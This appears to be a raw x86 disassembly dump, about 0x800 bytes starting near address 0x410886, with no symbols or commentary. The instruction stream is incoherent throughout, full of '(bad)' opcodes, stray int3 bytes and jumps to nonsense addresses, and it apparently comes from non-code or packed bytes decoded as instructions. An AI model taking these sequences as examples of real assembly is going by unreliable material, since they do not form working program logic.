  410886:	push   DWORD PTR [ecx+0x2d70838f]
  41088c:	add    BYTE PTR [eax],al
  41088e:	inc    DWORD PTR [eax]
  410890:	test   al,0x2a
  410892:	mov    bh,bh
  410894:	call   DWORD PTR ds:0xffd218ff
  41089a:	nop
  41089b:	call   0xff41d59f
  4108a0:	sbb    eax,0xffff8b46
  4108a5:	inc    ebx
  4108a6:	(bad)  
  4108a7:	jle    0x4108e6
  4108a9:	mov    DWORD PTR [edx],edx
  4108ab:	mov    ds:0xff00ff00,al
  4108b0:	in     eax,dx
  4108b1:	repz and bh,bh
  4108b4:	dec    eax
  4108b6:	jmp    FWORD PTR [edx-0x42]
  4108b9:	add    BYTE PTR [ebx-0x7c7c7692],al
  4108bf:	push   eax
  4108c1:	js     0x41084c
  4108c3:	(bad)  
  4108c4:	push   DWORD PTR [ecx+ecx*4+0x2d]
  4108c8:	mov    ch,0x0
  4108ca:	push   ds
  4108cb:	pop    ebx
  4108cc:	mov    DWORD PTR [eax],eax
  4108ce:	add    bh,bh
  4108d0:	push   ebp
  4108d1:	mov    eax,0x9900ff7c
  4108d6:	inc    DWORD PTR [edi]
  4108d8:	mov    es,WORD PTR [eax]
  4108da:	lods   eax,DWORD PTR ds:[esi]
  4108db:	(bad)  
  4108dc:	int3   
  4108dd:	add    bh,bh
  4108df:	inc    DWORD PTR ds:0xcc1446
  4108e5:	inc    edi
  4108e6:	xor    DWORD PTR [ebp+0x4cc78344],0xffffffff
  4108ed:	cmp    edi,0x0
  4108f0:	jl     0x41093c
  4108f2:	or     edi,edi
  4108f4:	call   DWORD PTR [ebp-0xf84434]
  4108fa:	push   eax
  4108fb:	imul   ecx,esp,0xffffffff
  4108fe:	add    bh,bh
  410900:	mov    ds:0xffb7c6,eax
  410905:	mov    edi,0x83647a89
  41090a:	push   edx
  41090b:	popa   
  41090c:	add    BYTE PTR [eax],al
  41090e:	inc    DWORD PTR [eax]
  410910:	pop    eax
  410911:	pop    eax
  410912:	xlat   BYTE PTR ds:[ebx]
  410913:	add    bh,bh
  410915:	mov    dl,0xff
  410917:	mov    esi,0x9f8d8922
  41091c:	inc    DWORD PTR [eax]
  41091e:	(bad)  
  41091f:	jmp    ebp
  410921:	and    edi,0x3c8900
  410927:	adc    DWORD PTR [esi-0x680c00],edi
  41092d:	int3   
  41092e:	add    DWORD PTR [eax],0x1a
  410931:	in     eax,dx
  410932:	or     DWORD PTR [eax],eax
  410934:	int3   
  410935:	mov    ch,0xff
  410937:	loop   0x4109a4
  410939:	mov    esi,edi
  41093b:	test   eax,0xffffffff
  410940:	xchg   BYTE PTR [esi],cl
  410942:	test   DWORD PTR [ecx-0x5100b300],ecx
  410948:	in     eax,dx
  410949:	add    BYTE PTR [eax+ebp*8+0x0],ah
  41094d:	int3   
  41094e:	int3   
  41094f:	(bad)  
  410950:	jp     0x41093e
  410952:	pop    eax
  410953:	add    BYTE PTR [eax],al
  410955:	mov    bl,0x83
  410957:	pop    esi
  410958:	cld    
  410959:	add    BYTE PTR [ebx-0x43],bh
  41095c:	(bad)  
  41095d:	(bad)  
  41095e:	(bad)  
  41095f:	dec    DWORD PTR [edi]
  410961:	pop    esi
  410962:	out    dx,eax
  410963:	inc    DWORD PTR [eax]
  410965:	in     eax,dx
  410966:	int3   
  410967:	xchg   ebp,eax
  410968:	push   edi
  410969:	mov    DWORD PTR [eax+0xffccec],ecx
  41096f:	call   DWORD PTR [ebp-0x782b]
  410975:	aad    0x0
  410977:	inc    edi
  410978:	out    0xff,eax
  41097a:	dec    edi
  41097b:	mov    edi,0xffff00
  410980:	xchg   edi,eax
  410981:	add    BYTE PTR [esi+0x0],ch
  410984:	add    BYTE PTR [ebx-0x7c081301],ah
  41098a:	mov    DWORD PTR [ebp+0x0],edi
  41098d:	add    BYTE PTR [eax],al
  41098f:	call   DWORD PTR [ecx-0xb]
  410992:	sbb    bh,bh
  410994:	sub    DWORD PTR [ebx+eax*4-0x3f],0xffffffba
  410999:	push   DWORD PTR [edi-0x61]
  41099c:	add    bh,bh
  41099e:	inc    DWORD PTR [ebx-0x4d0f6b]
  4109a4:	mov    ebx,edx
  4109a6:	dec    DWORD PTR [edx-0xa]
  4109a9:	xor    DWORD PTR [edi-0x33ff1f],0x0
  4109b0:	dec    esi
  4109b1:	stos   DWORD PTR es:[edi],eax
  4109b2:	loopne 0x41093d
  4109b4:	dec    DWORD PTR [edx]
  4109b6:	add    BYTE PTR [ecx+0x2a36cca2],bl
  4109bc:	mov    DWORD PTR [ebx-0x3faeff01],eax
  4109c2:	dec    eax
  4109c3:	or     esp,0xc
  4109c6:	int3   
  4109c7:	jb     0x410a33
  4109c9:	int3   
  4109ca:	sbb    ch,BYTE PTR [edi+edi*8-0x7d]
  4109ce:	add    BYTE PTR [ecx+0x146860],cl
  4109d4:	push   ebx
  4109d6:	call   DWORD PTR [edx+0x45]
  4109d9:	inc    DWORD PTR [ecx]
  4109db:	and    BYTE PTR [eax],al
  4109dd:	mov    DWORD PTR [eax],eax
  4109df:	add    BYTE PTR [edi],bl
  4109e1:	addr16 adc al,0x0
  4109e4:	inc    DWORD PTR [edi-0x49647d]
  4109ea:	test   BYTE PTR [ebp-0x1],ah
  4109f0:	xchg   bx,ax
  4109f2:	jp     0x4109f4
  4109f4:	int3   
  4109f5:	dec    ebp
  4109f6:	call   FWORD PTR [edx+0x4b588956]
  4109fc:	or     esp,0x0
  4109ff:	int3   
  410a00:	mov    bl,0x60
  410a02:	xchg   bh,bh
  410a04:	push   esi
  410a06:	push   DWORD PTR [edx]
  410a08:	(bad)  
  410a09:	add    BYTE PTR [esi+0xcc0037],bl
  410a0f:	jmp    DWORD PTR [ebx+0x12]
  410a12:	inc    edi
  410a13:	(bad)  
  410a14:	inc    DWORD PTR [ecx+ecx*4+0x75]
  410a18:	fadd   QWORD PTR [ebx-0xbb09]
  410a1e:	add    DWORD PTR [ebx-0x7c4bf635],0x0
  410a25:	inc    edx
  410a26:	adc    DWORD PTR [edx+0x7cc1ccfd],0xffffff83
  410a2d:	inc    DWORD PTR [eax]
  410a2f:	jmp    FWORD PTR [edi-0x76fff848]
  410a35:	cmp    esp,ecx
  410a37:	sub    dl,BYTE PTR [eax+eax*1+0xd391]
  410a3e:	add    BYTE PTR [ebx-0x182230],al
  410a44:	call   FWORD PTR [ebx-0x7ca40f7d]
  410a4a:	jne    0x410aae
  410a4c:	add    bh,bh
  410a4e:	mov    DWORD PTR [eax],eax
  410a50:	psubq  mm0,mm5
  410a53:	int3   
  410a54:	call   DWORD PTR [ebp+0x5907ff]
  410a5a:	mov    ds:0xff890a,al
  410a5f:	(bad)  
  410a60:	jmp    0x410a86
  410a62:	xchg   edi,eax
  410a63:	dec    esp
  410a65:	or     al,BYTE PTR [ebx+0x183a20e]
  410a6b:	jns    0x410a6d
  410a6d:	add    ah,cl
  410a6f:	add    BYTE PTR [ecx-0x7c7ce29f],cl
  410a75:	std    
  410a76:	add    ch,ah
  410a78:	test   DWORD PTR [eax],eax
  410a7a:	sub    BYTE PTR [ecx-0x1],ch
  410a7d:	inc    DWORD PTR [ebx+0x762becc]
  410a83:	(bad)  
  410a84:	push   DWORD PTR [eax]
  410a86:	sub    DWORD PTR [ebx-0x75],0xffffffff
  410a8a:	jne    0x410a9b
  410a8c:	int3   
  410a8d:	int3   
  410a8e:	(bad)  
  410a8f:	(bad)  
  410a90:	fistp  WORD PTR [ebx+0x78cc0040]
  410a96:	int3   
  410a97:	dec    edi
  410a98:	adc    edi,edi
  410a9a:	cmp    BYTE PTR [ecx+0xff],0x82
  410aa1:	test   eax,0xaaff00c9
  410aa6:	call   FWORD PTR [eax-0x59]
  410aa9:	call   DWORD PTR [edi-0x33]
  410aaf:	dec    DWORD PTR [edi-0x7c00f5b3]
  410ab5:	jle    0x410a83
  410ab7:	pop    edi
  410ab8:	push   DWORD PTR cs:[esi-0x66]
  410abc:	add    BYTE PTR [eax],al
  410abe:	int3   
  410abf:	mov    DWORD PTR [ecx-0x2c],edi
  410ac2:	dec    esi
  410ac3:	mov    DWORD PTR [eax],eax
  410ac5:	push   es
  410ac6:	adc    DWORD PTR [ecx-0x69],0xffffffff
  410aca:	imul   edx,DWORD PTR [edi-0x1],0x9eff8300
  410ad1:	add    bl,BYTE PTR [edi+0x77cc83]
  410ad7:	shl    BYTE PTR [eax-0x760f1e34],0xff
  410ade:	mov    DWORD PTR [eax],eax
  410ae0:	sub    edi,DWORD PTR [ebx+esi*1-0x7d]
  410ae4:	push   DWORD PTR [edi-0x1]
  410ae7:	stc    
  410ae8:	add    bh,bh
  410aea:	dec    ebx
  410aeb:	test   eax,0xff8300
  410af0:	in     al,0x6d
  410af2:	mov    edi,0x83e700ff
  410af7:	lods   eax,DWORD PTR ds:[esi]
  410af8:	(bad)  
  410afa:	in     al,0x64
  410afc:	add    bh,bh
  410afe:	cmp    edi,0xffffffb4
  410b01:	stc    
  410b02:	add    al,0xff
  410b04:	(bad)  
  410b05:	out    dx,al
  410b06:	add    BYTE PTR [esi],cl
  410b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b09:	inc    DWORD PTR [ecx-0x7c33a0]
  410b0f:	add    al,bh
  410b11:	sbb    BYTE PTR [ebp+0x5d0000],cl
  410b17:	pop    es
  410b18:	loop   0x410b1a
  410b1a:	mov    al,0xd5
  410b1c:	inc    DWORD PTR [eax]
  410b1e:	int3   
  410b1f:	dec    DWORD PTR [esi]
  410b21:	mov    edx,ebx
  410b23:	add    BYTE PTR [eax],al
  410b25:	pop    ebx
  410b26:	int3   
  410b27:	pop    ecx
  410b28:	pop    edi
  410b29:	jmp    ecx
  410b2b:	sub    al,0x83
  410b2d:	inc    DWORD PTR [ebx+0x43800]
  410b33:	cmp    edi,0xffffffff
  410b36:	add    BYTE PTR [edi],ch
  410b38:	or     eax,0xfff120ff
  410b3d:	inc    DWORD PTR [ebx+0x2cca400]
  410b43:	inc    DWORD PTR [ebx+0x3e6fffe8]
  410b49:	add    BYTE PTR [edx-0x3333ffbd],bh
  410b4f:	add    BYTE PTR [ebp-0x12],ch
  410b52:	loopne 0x410ad7
  410b54:	add    BYTE PTR [edi+edi*8],bl
  410b57:	(bad)  
  410b58:	mov    dl,0x83
  410b5a:	jno    0x410bce
  410b5c:	inc    DWORD PTR [eax]
  410b5e:	add    bh,bh
  410b60:	imul   esi,edx,0x3583ff2d
  410b66:	add    BYTE PTR [ecx+0x7473ccad],dh
  410b6c:	(bad)  
  410b6d:	inc    DWORD PTR [eax]
  410b6f:	(bad)  
  410b70:	jl     0x410b55
  410b72:	pusha  
  410b73:	add    DWORD PTR [eax],0x46
  410b76:	(bad)  
  410b77:	jns    0x410b4f
  410b79:	add    BYTE PTR [ecx-0xff0017],dh
  410b7f:	push   DWORD PTR [edx-0xffbe72]
  410b85:	inc    eax
  410b86:	call   FWORD PTR [ecx]
  410b88:	push   ds
  410b89:	int3   
  410b8a:	mov    ds:0x83ffff60,eax
  410b8f:	add    BYTE PTR [ebx-0xff0fd1],ch
  410b95:	inc    DWORD PTR ss:[edx]
  410b98:	push   ds
  410b99:	int3   
  410b9a:	test   DWORD PTR [ebp-0x1],0x2fcc0000
  410ba1:	ins    BYTE PTR es:[edi],dx
  410ba2:	xor    bh,bh
  410ba4:	(bad)  
  410ba5:	cmp    eax,0xc889ff
  410baa:	pop    edx
  410bab:	popf   
  410bac:	dec    esp
  410bae:	inc    DWORD PTR [eax]
  410bb0:	jmp    0xff02:0xffffc5bc
  410bb7:	into   
  410bb8:	lods   eax,DWORD PTR ds:[esi]
  410bb9:	dec    DWORD PTR ds:0xff67
  410bbf:	call   DWORD PTR [ecx-0x33b1bf]
  410bc5:	pusha  
  410bc6:	adc    ebx,0xffffffc5
  410bc9:	mov    ebp,edx
  410bcb:	mov    cl,0xcc
  410bcd:	add    BYTE PTR [eax],al
  410bcf:	add    dh,bh
  410bd1:	and    edx,esi
  410bd3:	inc    DWORD PTR [eax]
  410bd5:	(bad)  
  410bd7:	ret    
  410bd8:	jp     0x410bda
  410bda:	pop    ebx
  410bdb:	push   eax
  410bdc:	dec    esp
  410bde:	inc    DWORD PTR [eax]
  410be0:	cmp    eax,0xff7e3d
  410be5:	push   edx
  410be6:	dec    DWORD PTR [eax+0x41]
  410be9:	add    esp,0xffffff9b
  410bec:	inc    DWORD PTR [eax]
  410bee:	cmp    edi,0xffffffba
  410bf1:	sar    ebx,1
  410bf3:	add    BYTE PTR [eax],al
  410bf5:	ret    
  410bf6:	adc    DWORD PTR [edi],0xffffffb7
  410bf9:	mov    DWORD PTR ds:0xff008971,eax
  410bff:	and    DWORD PTR ds:0x83dd1b,0x12
  410c06:	add    DWORD PTR [ebx+0x3594ffec],0xffffffff
  410c0d:	(bad)  
  410c0e:	(bad)  
  410c0f:	call   DWORD PTR [edx-0x7c6be4]
  410c15:	cld    
  410c16:	add    BYTE PTR [edi-0x3a],dh
  410c19:	add    BYTE PTR [ebx-0x7c00ff34],dh
  410c1f:	mov    DWORD PTR ds:0xff00729c,esp
  410c25:	mov    bh,bh
  410c27:	ret    0x6d
  410c2a:	ret    0xff13
  410c2d:	dec    esp
  410c2f:	int3   
  410c30:	add    BYTE PTR [edx-0x1],al
  410c33:	int3   
  410c34:	add    ch,dh
  410c36:	int3   
  410c37:	(bad)
  410c3a:	popa   
  410c3b:	in     al,dx
  410c3c:	int3   
  410c3d:	add    bh,bh
  410c3f:	(bad)  
  410c40:	fistp  WORD PTR [esi]
  410c42:	cmp    DWORD PTR [eax],eax
  410c44:	add    BYTE PTR [esi],ah
  410c46:	mov    DWORD PTR [edx+0x5c1dcc6e],esi
  410c4c:	(bad)  
  410c4d:	inc    DWORD PTR [eax]
  410c4f:	add    ah,bh
  410c51:	ror    BYTE PTR [eax-0x34],1
  410c54:	call   FWORD PTR [ebx+0x0]
  410c57:	jg     0x410c2e
  410c59:	call   DWORD PTR [edi-0x7cd9]
  410c5f:	push   DWORD PTR [ebp+ebx*1+0x39ff005d]
  410c66:	jmp    DWORD PTR [ebx+0x77df835b]
  410c6c:	inc    DWORD PTR [eax]
  410c6e:	add    BYTE PTR [eax],al
  410c70:	mov    ebp,0xccccbe35
  410c75:	add    BYTE PTR [ebx-0x73ff72a5],0xb3
  410c7c:	inc    DWORD PTR [eax]
  410c7e:	(bad)  
  410c7f:	call   ebp
  410c81:	mov    edi,0xe283fff7
  410c86:	push   esi
  410c88:	jmp    0x89:0xff25deff
  410c8f:	add    dh,ch
  410c91:	cld    
  410c92:	hlt    
  410c93:	add    bh,bh
  410c95:	int    0xff
  410c97:	dec    ecx
  410c98:	aas    
  410c99:	push   edi
  410c9b:	push   es
  410c9c:	int3   
  410c9d:	(bad)  
  410c9e:	inc    DWORD PTR [eax]
  410ca0:	addr16 sbb al,0xb3
  410ca3:	add    BYTE PTR [eax],al
  410ca5:	add    ah,cl
  410ca7:	mov    bl,0x7
  410ca9:	(bad)  
  410caa:	jg     0x410cde
  410cac:	(bad)  
  410cad:	inc    DWORD PTR [eax]
  410caf:	add    bl,bl
  410cb1:	add    BYTE PTR [eax-0x77],al
  410cb4:	add    BYTE PTR [edi+0x0],ch
  410cb7:	mov    eax,0x8589ab
  410cbc:	cmp    edi,0xffffffff
  410cbf:	sub    esi,0xffffffca
  410cc2:	add    eax,0xffdaff00
  410cc7:	fwait
  410cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cc9:	add    BYTE PTR [eax+0x6e],bl
  410ccc:	add    BYTE PTR [eax],al
  410cce:	inc    DWORD PTR [eax]
  410cd0:	inc    esi
  410cd1:	push   edi
  410cd2:	fs mov edi,edi
  410cd5:	loop   0x410cd6
  410cd7:	int3   
  410cd8:	int3   
  410cd9:	sbb    DWORD PTR [edx+edi*2],0x0
  410cdd:	add    DWORD PTR [eax],0xffffff83
  410ce0:	jae    0x410d4a
  410ce2:	ret    0x8300
  410ce5:	and    BYTE PTR [eax],al
  410ce7:	jb     0x410d60
  410ce9:	sub    DWORD PTR [esi+edi*2],0x0
  410ced:	int3   
  410cee:	add    ah,cl
  410cf0:	cwde   
  410cf1:	add    BYTE PTR [edi+edi*8+0x4ffc3ff],dl
  410cf8:	out    dx,eax
  410cf9:	add    BYTE PTR [ecx-0x7cff7cb6],bh
  410cff:	call   DWORD PTR [edx-0x337c606a]
  410d05:	arpl   WORD PTR [eax],ax
  410d07:	pop    edi
  410d08:	lahf   
  410d09:	jmp    FWORD PTR [esi*1-0xff01]
  410d10:	popf   
  410d11:	iret   
  410d12:	fadd   DWORD PTR [eax]
  410d14:	call   esi
  410d16:	add    BYTE PTR [edi+ebx*1-0x34],bh
  410d1a:	nop
  410d1b:	push   ecx
  410d1c:	add    BYTE PTR [ebx+0xc5a00ff],al
  410d22:	pop    ebp
  410d23:	cmp    edi,0xffffffa3
  410d26:	jmp    FWORD PTR [eax]
  410d28:	push   0x31db00
  410d2d:	add    ah,cl
  410d2f:	or     DWORD PTR [esi-0x6d],0xffffffaf
  410d33:	mov    edi,edi
  410d35:	pop    DWORD PTR [ebx+0x5e0041fc]
  410d3b:	hlt    
  410d3c:	add    bh,bh
  410d3e:	add    bh,bh
  410d40:	jne    0x410d70
  410d42:	dec    eax
  410d43:	add    BYTE PTR [ecx-0x66497c4e],cl
  410d49:	add    BYTE PTR [edi+0xffa1],cl
  410d4f:	add    BYTE PTR [edi-0x1c],al
  410d52:	inc    BYTE PTR [eax]
  410d54:	add    BYTE PTR [ecx+0xb4e000],al
  410d5a:	xchg   ebp,eax
  410d5b:	lds    eax,FWORD PTR [eax]
  410d5d:	(bad)  
  410d5e:	(bad)  
  410d5f:	jmp    FWORD PTR [ebx-0x5a]
  410d62:	xor    esp,ecx
  410d64:	mov    DWORD PTR [edi+edi*8-0x37],ebx
  410d68:	and    eax,DWORD PTR [eax]
  410d6a:	cmp    ah,al
  410d6c:	add    DWORD PTR [eax],0xffffffff
  410d6f:	push   edi
  410d71:	bound  ebx,QWORD PTR [edi+edi*8+0x31839083]
  410d78:	daa    
  410d79:	add    BYTE PTR [edx+0x8383c8],ch
  410d7f:	add    dl,dl
  410d81:	fisttp DWORD PTR [edi+0x0]
  410d84:	dec    DWORD PTR ds:0xfff2d083
  410d8a:	int    0x2d
  410d8c:	mov    edi,edi
  410d8e:	(bad)  
  410d8f:	call   DWORD PTR [edx+0x21]
  410d92:	sar    bh,1
  410d94:	jmp    FWORD PTR [eax+eax*1+0x35]
  410d98:	mov    dl,0x0
  410d9a:	mov    dl,0x38
  410d9c:	(bad)  
  410d9d:	dec    esp
  410d9f:	call   FWORD PTR [ebp-0xdd99]
  410da5:	in     eax,0xff
  410da7:	loope  0x410de1
  410da9:	mov    ebx,ecx
  410dab:	(bad)  
  410dad:	add    bh,bh
  410daf:	(bad)  
  410db0:	inc    ebp
  410db2:	add    al,0x83
  410db4:	cmp    eax,0xffffffcc
  410db7:	mov    bh,0xba
  410db9:	sbb    DWORD PTR [esi+0x83005e],0xffffffff
  410dc0:	xor    DWORD PTR [edi-0x42],0xffe6ff00
  410dc7:	std    
  410dc8:	loopne 0x410dc9
  410dca:	sbb    ebp,DWORD PTR [eax]
  410dcc:	(bad)  
  410dcd:	(bad)  
  410dce:	inc    DWORD PTR [eax]
  410dd0:	mov    ebx,0xffcbd3
  410dd5:	cwde   
  410dd6:	int3   
  410dd7:	mov    ah,0xc9
  410dd9:	push   DWORD PTR [ebx+0x13]
  410ddc:	mov    edi,edi
  410dde:	(bad)  
  410ddf:	(bad)  
  410de0:	fsubp  st(3),st
  410de2:	popa   
  410de3:	int3   
  410de4:	add    BYTE PTR [edx],ah
  410de6:	add    BYTE PTR [ebp+eax*2-0x68d800],bl
  410ded:	cmp    edi,0x0
  410df0:	sub    bh,BYTE PTR [edi-0x22]
  410df3:	mov    DWORD PTR [eax],eax
  410df5:	(bad)  
  410df6:	dec    DWORD PTR [eax-0x20]
  410df9:	(bad)  
  410dfa:	cmp    bh,al
  410dfc:	(bad)  
  410dfd:	inc    DWORD PTR [eax]
  410dff:	jmp    DWORD PTR [ecx+ecx*1-0x6000ff65]
  410e06:	adc    DWORD PTR [edi+0x2],0xffffffff
  410e0a:	je     0x410da7
  410e0c:	dec    DWORD PTR [ecx-0x3cf80001]
  410e12:	push   ebx
  410e13:	inc    DWORD PTR [ebx-0x5b7933b6]
  410e19:	(bad)  
  410e1a:	out    dx,al
  410e1b:	inc    esp
  410e1c:	cmp    edi,0xffffffcc
  410e1f:	(bad)  
  410e20:	fnstcw WORD PTR [eax+0xc]
  410e23:	add    DWORD PTR [eax],0x15
  410e26:	push   DWORD PTR [esp+ebx*1-0x77]
  410e2a:	stos   DWORD PTR es:[edi],eax
  410e2b:	cmp    al,0x89
  410e2d:	inc    DWORD PTR [eax]
  410e2f:	(bad)  
  410e30:	cmp    BYTE PTR [ebp*4+0x71ff00],bh
  410e37:	dec    ebx
  410e38:	test   DWORD PTR [eax],0x83ff19ee
  410e3e:	dec    esp
  410e40:	xlat   BYTE PTR ds:[ebx]
  410e41:	ja     0x410e3b
  410e43:	add    DWORD PTR [eax],0xffffffbb
  410e46:	(bad)  
  410e47:	in     al,dx
  410e48:	pop    edi
  410e49:	mov    DWORD PTR [ebx],ecx
  410e4b:	pushf  
  410e4c:	inc    DWORD PTR [eax]
  410e4e:	mov    edi,edi
  410e50:	ja     0x410eb3
  410e52:	imul   eax,DWORD PTR [ebx+0x7dffe8ff],0xffffffe3
  410e59:	jmp    DWORD PTR [ebx-0x5a]
  410e5f:	int3   
  410e60:	lods   eax,DWORD PTR ds:[esi]
  410e61:	or     bl,0x83
  410e64:	call   FWORD PTR [ebx-0x3ea801]
  410e6a:	jg     0x410e69
  410e6c:	inc    DWORD PTR [eax]
  410e6e:	add    BYTE PTR [eax],al
  410e70:	inc    ebx
  410e71:	push   esi
  410e72:	test   bh,bh
  410e74:	add    BYTE PTR [ebx-0x27fb01],bl
  410e7a:	mov    al,ds:0xff1f
  410e7f:	(bad)  
  410e80:	cmp    al,0x97
  410e82:	call   0xffa60e87
  410e87:	cli    
  410e88:	cmp    DWORD PTR ss:[ecx+0xffff67],0xffffff83
  410e90:	adc    BYTE PTR [ebx-0x5d],dh
  410e93:	(bad)  
  410e94:	call   FWORD PTR [edx+0x688500]
  410e9a:	jl     0x410eaf
  410e9c:	inc    DWORD PTR [eax]
  410e9e:	(bad)  
  410e9f:	dec    ebp
  410ea1:	or     ebx,0xffffff83
  410ea4:	(bad)  
  410ea5:	in     al,dx
  410ea6:	add    BYTE PTR [esi+ebp*8-0x1],ch
  410eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eab:	jle    0x410ead
  410ead:	or     esp,0xffffff89
  410eb0:	into   
  410eb1:	test   DWORD PTR [eax-0x7d],ebx
  410eb4:	jmp    DWORD PTR [eax]
  410eb6:	add    BYTE PTR [eax+ebx*4-0x1],bh
  410eba:	mov    ds:0xffffffcc,eax
  410ebf:	add    BYTE PTR [edx-0x7cd543],ah
  410ec5:	sub    al,BYTE PTR [eax]
  410ec7:	ds push ebx
  410ec9:	int3   
  410eca:	popf   
  410ecb:	adc    al,BYTE PTR [eax]
  410ecd:	(bad)  
  410ece:	(bad)  
  410ecf:	inc    DWORD PTR [ecx]
  410ed1:	inc    ebx
  410ed2:	add    edi,edi
  410ed4:	push   DWORD PTR [edi-0x76f05101]
  410eda:	icebp  
  410edb:	nop
  410edc:	cmp    edi,0x0
  410edf:	inc    DWORD PTR [edi+0xa]
  410ee2:	call   0xffb10fe6
  410ee7:	repz test bh,bh
  410eea:	ins    DWORD PTR es:[edi],dx
  410eeb:	pop    edx
  410eec:	add    bh,bh
  410eee:	add    bh,bh
  410ef0:	imul   ecx,DWORD PTR [ecx+0x5e0000da],0xfffbe800
  410efa:	(bad)  
  410efb:	inc    esi
  410efc:	mov    DWORD PTR [eax],eax
  410efe:	cmp    edi,0x51
  410f01:	mov    dh,0xf7
  410f03:	(bad)  
  410f04:	call   esp
  410f06:	push   esi
  410f08:	test   eax,0x3085ff
  410f0d:	add    bh,bh
  410f0f:	xor    DWORD PTR [eax+0x2d],0x44
  410f13:	add    bh,bh
  410f15:	jp     0x410e9a
  410f17:	stos   BYTE PTR es:[edi],al
  410f18:	mov    edi,edi
  410f1a:	retf   0xcce0
  410f1d:	int3   
  410f1e:	add    BYTE PTR [ecx-0x7c85fc2e],cl
  410f24:	adc    DWORD PTR [ebp-0xe8b801],0xffffff9f
  410f2b:	mov    esp,0xcc8300ff
  410f30:	or     cl,BYTE PTR [esi]
  410f32:	and    bh,bh
  410f34:	add    BYTE PTR [eax-0x77],ch
  410f37:	sub    BYTE PTR [edx-0x1],ch
  410f3a:	add    DWORD PTR [edx-0x7c770000],esp
  410f40:	mov    al,0x8e
  410f42:	outs   dx,DWORD PTR ds:[esi]
  410f43:	(bad)  
  410f44:	call   DWORD PTR [edi-0x1]
  410f47:	inc    edi
  410f48:	(bad)  
  410f49:	dec    DWORD PTR [eax+0x68]
  410f4c:	(bad)  
  410f4d:	inc    DWORD PTR [ebx+0x136da9ff]
  410f53:	(bad)  
  410f54:	call   FWORD PTR [ebx-0x33801601]
  410f5a:	inc    edx
  410f5b:	pop    ds
  410f5c:	inc    DWORD PTR [ebx+0x11e683ff]
  410f62:	fiadd  WORD PTR [ebx-0x3100fd34]
  410f68:	mov    bl,0xff
  410f6a:	mov    WORD PTR [edi-0x1],ds
  410f6d:	(bad)  
  410f6e:	inc    DWORD PTR [eax]
  410f70:	ins    DWORD PTR es:[edi],dx
  410f71:	and    ch,al
  410f73:	add    BYTE PTR [ebx-0x7150ffbb],al
  410f79:	call   DWORD PTR [edi]
  410f7b:	or     esp,0x0
  410f7e:	or     DWORD PTR [ecx-0x9428f2],0xffffff83
  410f85:	xor    edi,edi
  410f87:	int    0xcf
  410f89:	jmp    DWORD PTR [eax-0x29]
  410f8c:	inc    DWORD PTR [eax]
  410f8e:	inc    DWORD PTR [eax]
  410f90:	inc    eax
  410f91:	jecxz  0x410f71
  410f93:	add    DWORD PTR [eax],0xffffffa3
  410f96:	dec    DWORD PTR [edi-0x27]
  410f99:	add    BYTE PTR [edi],cl
  410f9b:	sub    al,0xff
  410f9d:	mov    edi,edi
  410f9f:	add    BYTE PTR [ecx],dl
  410fa1:	mov    gs,WORD PTR [eax-0xe60000]
  410fa7:	push   ss
  410fa8:	out    0xff,al
  410faa:	add    al,0x4
  410fac:	(bad)  
  410fad:	(bad)  
  410fae:	inc    DWORD PTR [eax]
  410fb0:	ja     0x410fe1
  410fb2:	std    
  410fb3:	add    bh,bh
  410fb5:	(bad)  
  410fb6:	call   FWORD PTR [edx]
  410fb8:	nop
  410fb9:	(bad)  
  410fba:	mov    ebx,0xff00ffa3
  410fbf:	dec    DWORD PTR [esi-0x33001cd4]
  410fc5:	(bad)  
  410fc7:	rol    BYTE PTR [eax],cl
  410fc9:	int3   
  410fca:	pop    ecx
  410fcb:	add    bh,bh
  410fcd:	add    BYTE PTR [ebx+0x2118c6ff],al
  410fd3:	cmp    edi,0x18
  410fd6:	jmp    FWORD PTR [edx+eax*8-0x9c2700]
  410fdd:	dec    esp
  410fdf:	add    al,al
  410fe1:	dec    edx
  410fe2:	out    dx,eax
  410fe3:	mov    edi,edi
  410fe5:	mov    ds:0x1b9cc,eax
  410fea:	jge    0x410fda
  410fec:	int3   
  410fed:	inc    DWORD PTR [eax]
  410fef:	push   DWORD PTR [ecx-0x7c002550]
  410ff5:	add    BYTE PTR ds:0x8a6589f5,bh
  410ffc:	add    BYTE PTR [ebx-0xfb00000],al
  411002:	(bad)  
  411003:	add    BYTE PTR [eax],al
  411005:	pop    edi
  411006:	push   DWORD PTR [ebx+0x77]
  411009:	push   ecx
  41100b:	in     al,0xcc
  41100d:	or     esp,0x0
  411010:	retf   0xdb27
  411013:	inc    DWORD PTR [eax]
  411015:	cdq    
  411016:	add    BYTE PTR [ebx-0x2b],dl
  411019:	jmp    DWORD PTR [edx+0x7a]
  41101c:	add    ah,cl
  41101e:	inc    DWORD PTR [eax]
  411020:	and    al,0xbd
  411022:	xor    bh,bh
  411024:	dec    DWORD PTR [esi+0x2f38ff]
  41102a:	fnstcw WORD PTR [edi-0x7d]
  41102d:	add    BYTE PTR [eax],al
  41102f:	xor    DWORD PTR [ebx+esi*4],0x2f
  411033:	dec    esp
  411035:	test   edi,edi
  411037:	cld    
  411038:	jp     0x411006
  41103a:	jg     0x4110b6
  41103c:	add    DWORD PTR [eax],0xffffffff
  41103f:	call   FWORD PTR [edi]
  411041:	ret    
  411042:	or     DWORD PTR [ebx+0xaffc0ff],eax
  411048:	pop    esi
  411049:	or     edx,0x10
  41104c:	cmp    edi,0xffffffcc
  41104f:	jmp    DWORD PTR [esi]
  411051:	fidivr DWORD PTR [ecx]
  411053:	dec    DWORD PTR [ecx+0x7f77ccc5]
  411059:	mov    edx,ebx
  41105b:	test   BYTE PTR [eax],al
  41105d:	inc    DWORD PTR [eax]
  41105f:	add    BYTE PTR [eax+0x1d],bl
  411062:	popa   
  411063:	cmp    edi,0x22
  411066:	mov    DWORD PTR [ebp+0x18],eax
  411069:	inc    DWORD PTR [ecx-0x5f]
  41106c:	(bad)  
  41106d:	inc    DWORD PTR [eax]
  41106f:	call   FWORD PTR [ecx]
  411071:	test   eax,0xb800ff0a
  411076:	call   DWORD PTR [ebx+0x58]
  411079:	xor    DWORD PTR [edx],0x25
  41107c:	inc    DWORD PTR [eax]
  41107e:	inc    DWORD PTR [eax]
  411080:	or     al,0x28
  411082:	adc    edi,edi
  411084:	mov    DWORD PTR [eax+eax*1+0x39ffbeb9],esi
  41108b:	stc    
  41108c:	inc    DWORD PTR [eax]
  41108e:	add    BYTE PTR [eax],al
